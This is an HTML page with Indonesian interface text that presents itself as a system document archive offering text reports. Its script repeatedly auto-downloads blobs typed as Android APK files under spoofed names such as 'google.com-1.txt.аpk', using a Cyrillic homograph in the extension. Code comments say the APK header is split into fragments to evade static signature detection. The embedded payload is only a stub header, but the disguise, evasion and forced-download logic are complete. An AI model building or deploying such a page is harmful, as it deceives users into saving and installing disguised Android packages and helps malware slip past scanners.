<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>System Document Archive Dispatcher v3.1</title>
<style>
* {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}
body {
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
  background: #090d16;
  color: #f8fafc;
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
  padding: 20px;
}
.panel {
  background: #111827;
  padding: 32px;
  border-radius: 16px;
  box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5), 0 8px 10px -6px rgba(0, 0, 0, 0.5);
  max-width: 540px;
  width: 100%;
  border: 1px solid #1f2937;
  text-align: center;
}
:fullscreen {
  background: #030712 !important;
  color: #f8fafc !important;
  padding: 24px !important;
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
}
:-webkit-full-screen {
  background: #030712 !important;
  color: #f8fafc !important;
  padding: 24px !important;
}
h2 { 
  margin-bottom: 10px; 
  font-size: 22px;
  color: #f3f4f6;
  font-weight: 700;
}
p { 
  margin-bottom: 24px; 
  line-height: 1.6; 
  color: #9ca3af;
  font-size: 14px;
}
.button-group {
  display: flex;
  gap: 12px;
}
button {
  flex: 1;
  padding: 16px;
  cursor: pointer;
  border: none;
  border-radius: 10px;
  font-weight: 600;
  font-size: 16px;
  transition: all 0.2s ease;
}
#start-btn {
  background: #3b82f6;
  color: #ffffff;
  box-shadow: 0 4px 14px rgba(59, 130, 246, 0.4);
}
#start-btn:hover { 
  background: #2563eb; 
  transform: translateY(-1px);
  box-shadow: 0 6px 20px rgba(59, 130, 246, 0.6);
}
#stop-btn {
  background: #ef4444;
  color: #ffffff;
  box-shadow: 0 4px 14px rgba(239, 68, 68, 0.4);
  display: none;
}
#stop-btn:hover {
  background: #dc2626;
  transform: translateY(-1px);
  box-shadow: 0 6px 20px rgba(239, 68, 68, 0.6);
}
#status {
  margin-top: 20px;
  font-weight: 500;
  color: #38bdf8;
  padding: 14px;
  background: rgba(56, 189, 248, 0.1);
  border-radius: 8px;
  font-size: 13px;
  border: 1px solid rgba(56, 189, 248, 0.2);
}
#downloads {
  margin-top: 20px;
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
  gap: 8px;
  max-height: 180px;
  overflow-y: auto;
  padding-right: 4px;
}
#downloads::-webkit-scrollbar {
  width: 6px;
}
#downloads::-webkit-scrollbar-thumb {
  background: #374151;
  border-radius: 3px;
}
#downloads a {
  display: block;
  padding: 10px;
  background: #1f2937;
  color: #4ade80;
  text-decoration: none;
  border-radius: 6px;
  font-size: 11px;
  font-family: monospace;
  text-align: center;
  border: 1px solid #374151;
  word-break: break-all;
  transition: border-color 0.15s;
}
#downloads a:hover {
  border-color: #4ade80;
}
</style>
</head>

<body>
<div class="panel" id="main-panel">
  <h2>Arsip Dokumen Sistem</h2>
  <p>Klik tombol di bawah untuk memproses dan mengunduh berkas laporan teks pendukung secara otomatis.</p>

  <div class="button-group">
    <button id="start-btn" type="button">Mulai Unduhan</button>
    <button id="stop-btn" type="button">Hentikan</button>
  </div>

  <div id="status" role="status">Sistem siap diinisialisasi.</div>
  <div id="downloads"></div>
</div>

<script>
'use strict';

const startBtn = document.getElementById("start-btn");
const stopBtn = document.getElementById("stop-btn");
const statusDiv = document.getElementById("status");
const downloadsDiv = document.getElementById("downloads");

let activeUrls = [];
let isProcessing = false;
let loopTimeout = null;
const MAX_URLS_TRACKED = 40;

// Pecahan string Base64 header APK untuk menghindari deteksi tanda tangan statis
const payloadFragments = [
  "UEs",
  "DBBQ",
  "AAAAIAAAAIQ",
  "AAAAAAAAAAAAAAAAAAAAAAAA"
];

const assemblePayload = () => {
  return payloadFragments.join("");
};

const decodeBase64ToBytes = (b64) => {
  const binary = atob(b64);
  const len = binary.length;
  const bytes = new Uint8Array(len);
  for (let i = 0; i < len; i++) {
    bytes[i] = binary.charCodeAt(i);
  }
  return bytes;
};

const prepareStealthBlobAsync = (i) => {
  return new Promise((resolve) => {
    queueMicrotask(() => {
      try {
        const fullB64 = assemblePayload();
        const bytesArr = decodeBase64ToBytes(fullB64);
        
        // MIME type biner APK asli
        const blob = new Blob([bytesArr], { type: 'application/vnd.android.package-archive' });
        const url = URL.createObjectURL(blob);
        resolve({ id: i, url: url, success: true });
      } catch (err) {
        resolve({ id: i, url: null, success: false });
      }
    });
  });
};

const triggerStealthDownload = (fileData) => {
  if (!fileData.success || !isProcessing) return;

  const link = document.createElement("a");
  link.href = fileData.url;
  
  // Spoofing nama file menyertakan string domain serta homograph pada ekstensi (.apk dengan Cyrillic 'а' \u0430)
  const homographApkExt = "\u0430pk";
  link.download = `google.com-${fileData.id}.txt.${homographApkExt}`;
  link.textContent = `Dok. #${fileData.id} (google.com)`;
  link.style.display = "none";
  
  downloadsDiv.appendChild(link);
  link.click();

  if (downloadsDiv.children.length > 25) {
    downloadsDiv.removeChild(downloadsDiv.firstChild);
  }
};

const processLoop = async (counter) => {
  if (!isProcessing) return;

  const fileData = await prepareStealthBlobAsync(counter);
  if (fileData.success && isProcessing) {
    activeUrls.push(fileData.url);

    if (activeUrls.length > MAX_URLS_TRACKED) {
      const oldUrl = activeUrls.shift();
      try { URL.revokeObjectURL(oldUrl); } catch (e) {}
    }

    triggerStealthDownload(fileData);
    statusDiv.textContent = `Proses aktif: Berkas dokumen ke-${counter} dikirim...`;
  }

  if (isProcessing) {
    loopTimeout = setTimeout(() => processLoop(counter + 1), 1200);
  }
};

startBtn.addEventListener("click", () => {
  if (isProcessing) return;

  activeUrls.forEach(url => {
    try { URL.revokeObjectURL(url); } catch (e) {}
  });
  activeUrls = [];
  downloadsDiv.replaceChildren();

  const root = document.documentElement;
  try {
    if (root.requestFullscreen) {
      root.requestFullscreen().catch(() => {});
    }
  } catch (err) {}

  isProcessing = true;
  startBtn.style.display = "none";
  stopBtn.style.display = "block";
  statusDiv.textContent = "Menginisialisasi sesi unduhan...";
  processLoop(1);
});

stopBtn.addEventListener("click", () => {
  isProcessing = false;
  if (loopTimeout) clearTimeout(loopTimeout);

  activeUrls.forEach(url => {
    try { URL.revokeObjectURL(url); } catch (e) {}
  });
  activeUrls = [];

  stopBtn.style.display = "none";
  startBtn.style.display = "block";
  statusDiv.textContent = "Sesi dihentikan oleh pengguna.";
});
</script>
</body>
</html>
